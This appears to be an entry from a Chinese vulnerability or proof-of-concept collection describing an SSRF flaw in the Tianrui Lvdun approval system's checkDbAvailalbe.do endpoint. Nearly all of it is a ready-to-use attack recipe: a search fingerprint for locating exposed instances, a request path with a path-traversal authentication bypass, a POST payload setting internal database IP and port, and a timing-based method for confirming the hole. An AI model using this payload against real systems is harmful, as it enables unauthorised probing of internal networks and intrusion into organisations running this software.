# 天锐绿盾审批系统checkDbAvailalbe.do存在SSRF漏洞

天锐绿盾 ｜ SSRF ｜ —
- **指纹**：`body="location.href=location.href+\"`
- **请求**：`POST /trwfe/login.jsp/.%2e/config/checkDbAvailalbe.do HTTP/1.1`

**Payload**
```
dbIp=127.0.0.1&dbPort=8280&dbName=test&dbAccount=
```
- **响应特征**：200 通过改变端口例如：8280的响应时间进行判定